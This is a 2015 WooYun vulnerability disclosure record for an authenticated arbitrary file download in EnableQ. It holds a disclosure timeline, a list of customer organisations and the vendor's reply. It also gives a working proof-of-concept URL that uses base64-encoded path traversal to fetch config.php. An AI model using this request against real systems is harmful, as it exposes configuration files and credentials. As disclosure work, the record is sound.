{"id": 69247, "wybug_id": "wooyun-2015-0127987", "wybug_title": "EnableQ最新版任意文件下载一枚（需要登录）", "wybug_corp": "北京科维能动信息技术有限公司", "wybug_author": "Bear baby", "wybug_date": "2015-07-21 11:22", "wybug_open_date": "2015-10-22 09:28", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向公众公开  简要描述： 案例： 调查、咨询机构   北京华通明略信息咨询有限公司   北京零点市场调查与分析公司   北京邓白氏慧聪市场信息咨询有限公司   北京慧聪资道咨询有限公司   北京环亚市场研究社   北京勺海市场调查有限责任公司   北京新生代市场监测机构有限公司   拓索市场咨询(北京)有限公司   北京博思惠恩营销顾问有限责任公司   联信天下(北京)国际市场调查有限公司   北京宣亚培恩国际公关顾问有限公司   上海安旭市场调研服务有限公司北京分公司   北京博纳支点企业顾问公司   北京市中瑞信信息咨询有限公司   北京赛诺市场研究有限责任公司     北京赛诺经典管理咨询有限公司   北京赛诺营销顾问有限公司   北京思捷讯管理咨询有限责任公司   北京博万管理咨询有限公司   北京勤达信咨询有限责任公司   爱普邦德(北京)管理顾问有限公司   北京德信宏远信息技术有限公司   北京麦威信息咨询有限公司   北京西点方略营销顾问有限责任公司   北京英特维市场调查有限公司   北京思纬亿联营销咨询有限公司   观行(北京)管理咨询有限公司   北京安盛友邦药店管理顾问有限公司   北京思特威信息咨询有限公司   中研国际时尚品牌管理咨询集团   北京龙品智合文化传媒有限公司   北京华财理账顾问有限公司   北京人卫医院管理中心   北京吉六教育咨询中心   上海慧辰咨道咨询有限公司   上海群思商务咨询有限公司   远鼎信息科技(上海)有限公司   励衿(上海)企业管理咨询有限公司   上海起航企业管理咨询有限公司   上海崇理企业管理咨询有限公司   上海意创云市场营销咨询有限公司   深圳市银雁金融配套服务有限公司   广州优加市场调研有限公司   广州市准诚市场咨询有限公司   广州博力富软件科技有限公司   重庆立信市场研究有限公司   成都知讯市场研究有限公司   福建省质协用户评价中心   湖北正达银友传媒有限公司   宁波市远东零点市场调研咨询有限公司   沈阳新时源传媒广告有限责任公司   大连鸿博传媒有限公司   新疆乌鲁木齐市海景心理咨询有限公司  政府及直属事业单位    国家统计局农村社会经济调查司   国家信息中心经济咨询中心   国家新闻出版广电总局信息中心   国家体育总局体育信息中心   人力资源和社会保障部中国人事科学研究院   中国科学技术协会信息中心   中国国际贸易促进委员会经济信息部   云南省大理白族自治州人民政府   北京市统计局计算中心   北京市社情民意调查中心   湖南省娄底市统计局   国家统计局日照调查队   广东省广州市越秀区统计局   吉林省国家税务局   山东省济南市国家税务局   河北省邯郸市地方税务局军队    总参谋部某部   总装备部某部电信    浙江移动通信有限责任公司金华分公司   中国移动通信集团安徽有限公司铜陵分公司金融   中国人民银行营业管理部   广发基金管理有限公司   华夏基金管理有限公司   恒信金融租赁有限公司   天风证券股份有限公司上市公司    中国南方航空股份有限公司 (上市股票代码:600029)   一汽轿车股份有限公司 (深市股票代码:000800)   弘成科技发展有限公司 (NASDAQ:CEDU)   方正科技集团股份有限公司 (上市股票代码:600601)   湖北宜化化工股份有限公司 (深市股票代码:000422) 企业    联想控股有限公司      金蝶友商电子商务服务有限公司(友商网：www.youshang.com)   上海商派网络科技有限公司(www.shopex.cn)   一汽-大众汽车有限公司   奥的斯电梯(中国)有限公司   万顺昌-瑞尔盛中国有限公司   TCL通力电子(惠州)有限公司   林德(中国)叉车有限公司   矢崎(中国)投资有限公司   北京外企人力资源服务有限公司   广州市恩尼世贸易有限公司    中国土木工程集团有限公司   甘肃白银银珠电力集团有限责任公司信息技术服务分公司   雷诺股份有限公司北京代表处   湖南益丰大药房医药连锁有限公司   北京顺驰置地达兴房地产开发有限公司   多维联合集团有限公司   上海承大网络科技服务有限公司   深圳市华盛置业有限公司商业    百荣百尚置业投资有限公司   西单大悦城有限公司   北京崇文新世界房地产发展有限公司   迪脉(上海)企业管理有限公司   真维斯服饰(中国)有限公司图书馆    中国医学科学院图书馆   北京联合大学应用文理学院图书馆科研机构   中国科学院高能物理研究所   中国社会科学院马克思主义研究院   中国社会科学院新闻与传播研究所   中国水产科学研究院   中国医学科学院医学信息研究所   中国中医科学院中医临床基础医学研究所   中国林业科学研究院林业科技信息研究所   中国人民大学文化产业研究院   国家语言资源监测与研究中心少数民族语言分中心   北京市城市规划设计研究院   贵州电力试验研究院   大港油田钻采工艺研究院   首都儿科研究所流行病室   北京外国语大学中国外语教育研究中心   北京城市系统工程研究中心教育单位    中国科学院研究生院   复旦大学管理学院   同济大学经济与管理学院   中国人民大学劳动人事学院   北京师范大学教育培训中心   哈尔滨工业大学   东北财经大学中德会计学院   中国政法大学外国语学院   中国农业大学食品科学与营养工程学院   北京工业大学经济与管理学院   北京工业大学信息处   首都经济贸易大学经济学院   北京信息科技大学经济管理学院   郑州大学公共卫生学院   北京工商大学   苏州大学   中国美术学院   兰州大学网络教育学院   上海师范大学法政学院   东北师范大学学生就业指导服务中心   华中科技大学土木工程与力学学院   北京联合大学信息网络中心   北京青年政治学院   农业部管理干部学院   潍坊学院   山东万杰医学院   马鞍山职业技术学院   广东交通职业技术学院   北京市西城区教育研修学院   浙江邮电职业技术学院   绍兴职业技术学院   厦门市思明区教师进修学校   昆明铁路机械学校   北京景山学校   北方交通大学附属中学   北京汇文中学   北京市第一六一中学   北京市第二十一中学   北京市第七中学   北京二龙路中学   北京市三里屯一中 文化、出版、媒体    新华通讯社<新华每日电讯>社   新华通讯社<经济参考报>社   <重庆晨报>社   天津市今晚传媒广告有限公司(天津今晚报社)   唐山劳动日报社   <新财经>杂志社   <中国科技财富>杂志社   山东电视台新媒体中心技术部   广东省梅州市广播电视台   外语教学与研究出版社互联网    新浪网技术(中国)有限公司(新浪网：www.sina.com.cn)   北京天盈创智广告有限公司(凤凰网：www.ifeng.com)   北京车之家信息技术有限公司(汽车之家：www.autohome.com.cn)   北京世纪摇篮网络技术有限公司(摇篮网：www.yaolan.com)   上海喜讯文化传播有限公司(喜讯网：www.xixun.cn)   烟台金润科技有限公司(食品伙伴网：www.foodmate.net)   陕西省演出经纪人协会(中国演出网：www.zgycw.net)   北京唐友广告有限公司(糖友网：www.tnbzy.com)   北京睿思汇通移动科技有限公司(Rexsee：www.rexsee.com)大陆之外    Linkful Software Partners Inc.(菲律宾)   香港科技大学土木与环境工程系其他    中国质量协会   中国环境科学学会   中国互联网协会   中国测绘学会   中国岩石力学与工程学会   中国家用电器服务维修协会 详细说明：  \nhttp://www.enableq.com/enableq/WebAPI/Down.php?path=Li4vUGVyVXNlckRhdGEvLi4vQ29uZmlnLw==&file=Y29uZmlnLnBocA==\npath:这参数是表示文件路径的，\n../PerUserData/../Config/\n将这个路径base64加密后是\n\nfile：这参数写需要下载的文件名,我们来下载config.php这个文件\n\n构造出最终地址\nhttp://www.enableq.com/enableq/WebAPI/Down.php?path=Li4vUGVyVXNlckRhdGEvLi4vQ29uZmlnLw==&file=Y29uZmlnLnBocA==\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-24 09:27 厂商回复： 该漏洞首先需要在已安装的EnableQ系统中获取一个合法的用户身份，并进行登录后才发生。作者给出的验证过程是因为官方提供的试用平台本身为方便潜在客户体验EnableQ系统，特意单独编写的用户注册体系的存在，对外发行的版本中无系统用户注册模块。感谢@Bear baby。已对风险排查和处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}